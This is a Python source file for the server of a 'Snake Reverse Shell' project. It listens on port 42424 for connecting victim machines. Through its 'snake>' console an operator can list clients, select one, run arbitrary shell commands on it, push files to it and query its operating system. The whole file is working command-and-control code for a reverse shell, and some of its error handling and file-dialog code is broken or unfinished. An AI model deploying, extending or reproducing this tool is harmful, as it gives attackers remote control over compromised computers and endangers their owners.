# server script for the snake reverse shell project
# By @ofer026

import socket
import threading
from _thread import *
from queue import Queue
from time import sleep
from tkinter import filedialog
import tkinter as tk
import platform
import getpass
import os

# ------- CONSTANTS -------
HEADERSIZE = 10
number_of_threads = 2
job_number = [1, 2]
queue = Queue()

all_connections = []
all_addresses = []
# List of all commands in the interactive prompt and unique commands in the shell
COMMANDS = {'help': ['Shows this help'],
            'list': ['Lists connected clients'],
            'select': ['Selects a client by its index. Takes index as a parameter'],
            'send': ['Sends a file (Up to 9 GB) to a client. To be used in the interactive prompt'],
            'getos': ['Prints the OS of the selected client. To be used when client is selected'],
            'info': ['Prints information about the client machine, this command will work only if the client machine OS is Windows. To be used when client is selected'],
            'information': ['Prints information about the client machine, this command will work only if the client machine OS is not Windows. To be used when client is selected'],
            'quit': ['Stops current connection with a client. To be used when client is selected'],
            'shutdown': ['Shuts server down'],
            }

# --------- Hello Message ------------
hello_message_1 = "__        __         _                                       _               ____                    _\n" \
                  "\ \      / /   ___  | |   ___    ___    _ __ ___     ___    | |_    ___     / ___|   _ __     __ _  | | __   ___ \n" \
                  " \ \ /\ / /   / _ \ | |  / __|  / _ \  | '_ ` _ \   / _ \   | __|  / _ \    \___ \  | '_ \   / _` | | |/ /  / _ \ \n" \
                  "  \ V  V /   |  __/ | | | (__  | (_) | | | | | | | |  __/   | |_  | (_) |    ___) | | | | | | (_| | |   <  |  __/\n" \
                  "   \_/\_/     \___| |_|  \___|  \___/  |_| |_| |_|  \___|    \__|  \___/    |____/  |_| |_|  \__,_| |_|\_\  \___|"
hello_message_2 = " ____                                                ____    _              _   _\n" \
                  "|  _ \    ___  __   __   ___   _ __   ___    ___    / ___|  | |__     ___  | | | |\n" \
                  "| |_) |  / _ \ \ \ / /  / _ \ | '__| / __|  / _ \   \___ \  | '_ \   / _ \ | | | |\n" \
                  "|  _ <  |  __/  \ V /  |  __/ | |    \__ \ |  __/    ___) | | | | | |  __/ | | | |\n" \
                  "|_| \_\  \___|   \_/    \___| |_|    |___/  \___|   |____/  |_| |_|  \___| |_| |_|\n"


# prints all the commands and their description when "help" is typed in the interactive prompt
def help():
    for cmd, v in COMMANDS.items():
        print("{0}:\t{1}".format(cmd, v[0]))


def setup():
    """
    This function sets up the socket to listen for connections
    :return: None
    """
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("", 42424))  # bind the socket to every possible way to reach the machine on port 42424
    s.listen(10)  # listen to up to 10 connections
    print("[*] Waiting for connections")


def accept_connections():
    """
    This function accepts all arriving connections
    :return: None
    """
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while True:
        try:
            lock = threading.Lock()
            clientsocket, address = s.accept()
            clientsocket.setblocking(True)
            all_connections.append(clientsocket)
            all_addresses.append(address)
            print(f"\nConnection from {address[0]}:{address[1]} has been established.")
        except ValueError as e:
            print("Error accepting connections. Exception: {}".format(e))


# Interactive prompt for sending commands remotely
def start_snake():
    """
    This function handles the input from the interactive prompt
    :return: None
    """
    sleep(0.5)  # enable the server to initialize before the interactive prompt
    while True:
        try:
            cmd = input("snake> ")
        except EOFError:
            pass
        if "list" in cmd:
            list_connections()
        elif "select" in cmd:
            conn = get_target(cmd)  # Get the selected socket object
            if conn is not None:  # Checks if the sockets is not None (if its exists)
                send_target_commands(conn)  # Start sending commands to the target socket
        elif "shutdown" in cmd:
            # Close all jobs
            queue.task_done()
            queue.task_done()
            # Exit the program completely
            quit()
        elif "send" in cmd:
            list_connections()
            send_files(win) # Starts the process of sending a file to the target socket
        elif "help" in cmd:
            help()
        else:
            print("snake: Command \'{}\' is not recognized".format(cmd))


# send files to a selected client
def send_files(window):
    """
    This function sends a file to a selected client
    :param window: Tkinter window object
    :return: None
    """
    try:
        connection_num = int(input("select a connection> "))  # gets the desired connection from the user
        if connection_num <= -1:  # Checks if the number is valid
            print("Enter a positive number")
            raise Exception("Negative number given")
        conn = all_connections[connection_num]  # Gets the connection object from the connections list
    except ValueError:
        print("Enter a Number")
        return  # Returns to the interactive prompt
    except IndexError:
        print("Enter a number within the range of connections numbers")
        return  # Returns to the interactive prompt
    except Exception("Negative number given"):
        return  # Returns to the interactive prompt
    win_or_path = input("Do you want to enter the path(p or path) or select from a dialog(d or dialog)?\nYour answer: ")
    if win_or_path.lower() == "p" or win_or_path.lower() == "path":
        path = input("Enter the path: ")
        if not os.path.exists(path):  # Checks if the file specified exists
            print("File not found!")
            return  # Returns to the interactive prompt
        if not os.path.isfile(path):  # Checks if the file specified is a file and not a folder
            print("This is not a file!")
            return  # Returns to the interactive prompt
        if os.stat(path).st_size > 9000009000:  # Checks if the file size is within the size limit
            print("File is too big! the maximum size is 9 GB")
            return  # Returns to the interactive prompt
        file = open(path, "r")
        file_content = file.read()
        file.close()
        msg = " efile " + str(os.path.basename(path)) + " endname " + file_content
        file_msg = f"{len(msg):<{HEADERSIZE}}" + " efile " + str(os.path.basename(path)) + " endname " + file_content
        conn.send(bytes(file_msg, "utf-8"))
        confirm_msg = ""
        is_new = True
        while True:
            try:
                msg = conn.recv(16)
            except ConnectionResetError:
                print("Connection has been closed by the client")
                return
            if is_new:
                '''
                This if statement checks if this a new message. if true we expect to the header of the message,
                which has the length of the message inside
                '''
                try:
                    response_len = int(msg[:HEADERSIZE])
                except ValueError:
                    print("Error while getting the command length")
                    continue
                is_new = False
            confirm_msg += msg.decode("utf-8")
            if len(confirm_msg) - HEADERSIZE == response_len:
                print(confirm_msg[HEADERSIZE:])
                break
        return
    elif win_or_path.lower() == "d" or win_or_path.lower() == "dialog":
        if platform.system() == "Windows":
            window.file = filedialog.askopenfile(parent=win, initialdir=f"C:\\Users\\{getpass.getuser()}\\Documents", title="Select File")



# Displays all current connections
def list_connections():
    """
    This function displays all current connection nd checks if they are still active
    (if not the connection is deleted)
    :return: None
    """
    results = "id      IP          Port\n"
    for i, connection in enumerate(all_connections):
        try:
            check_alive_msg = "check alive test"  # The echo message content
            check_alive_msg = f"{len(check_alive_msg):<{HEADERSIZE}}" + check_alive_msg
            connection.send(bytes(check_alive_msg, "utf-8"))
            connection.recv(1024)
        except:
            # If there was a problem sending a message to the socket and receiving data from it, the connection will be deleted
            del all_connections[i]
            del all_addresses[i]
            continue
        results += str(i) + "   " + str(all_addresses[i][0]) + "   " + str(all_addresses[i][1]) + "\n"
    print("------- Clients ------" + "\n" + results)


def get_target(cmd):
    """
    This function get the target socket from the list of connections
    :param cmd: int
    :return: socket object (or None)
    """
    try:
        target = cmd.replace("select ", "")
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to {}".format(all_addresses[target][0]))
        print(str(all_addresses[target][0]) + "> ", end="")
        return conn
    except:
        print("Not a valid selection")
        return None


# Connect with remote target client
def send_target_commands(conn):
    """
    This function sends commands to the selected socket and gets the output of those commands from the target socket
    :param conn: socket object
    :return: None
    """
    while True:
        try:
            cmd = input()  # get the command the user want to send to the target
            if cmd == "quit":
                break  # returns back to the interactive prompt
            if len(str.encode(cmd)) > 0:
                cmd = f"{len(cmd):<{HEADERSIZE}}" + cmd  # add the header to the command
                conn.send(bytes(cmd, "utf-8"))
                client_response = ""
                is_new = True
                while True:
                    try:
                        msg = conn.recv(16)
                    except ConnectionResetError:
                        print("Connection has been closed by the client")
                        return
                    if is_new:
                        '''
                        This if statement checks if this a new message. if true we expect to the header of the message,
                        which has the length of the message inside
                        '''
                        try:
                            response_len = int(msg[:HEADERSIZE])
                        except ValueError:
                            print("Error while getting the command length")
                            continue
                        is_new = False
                    client_response += msg.decode("utf-8")
                    if len(client_response) - HEADERSIZE == response_len:
                        print(client_response[HEADERSIZE:], end="")
                        break
        except Exception as e:
            print("Connection was lost. Exception: {}".format(e))
            break


# Create worker threads
threads = []


def create_workers():
    """
    This function creates the threads (workers)
    :return: None
    """
    for _ in range(number_of_threads):
        t = start_new_thread(work, (None, None))
        threads.append(t)


# Do the next job in the queue (one handles connections,  other sends commands)
def work(h, g):
    """
    this function alloctes the tasks to the threads
    one thread sets up the server socket and listens to new connections,
    and the other handles commands from the interactive prompt and sends commands to selected targets
    :param h: None
    :param g: None
    :return: None
    """
    while True:
        x = queue.get()
        if x == 1:
            setup()
            accept_connections()
        if x == 2:
            start_snake()  # Starts the interactive prompt
        queue.task_done()


# Each list item is a new job
def create_jobs():
    for x in job_number:
        queue.put(x)
    queue.join()


if __name__ == "__main__":
    global win
    win = tk.Tk()
    win.withdraw()
    print(hello_message_1)
    print(hello_message_2)
    print("type \'help\' to get the list of all commands")
    create_workers()
    create_jobs()

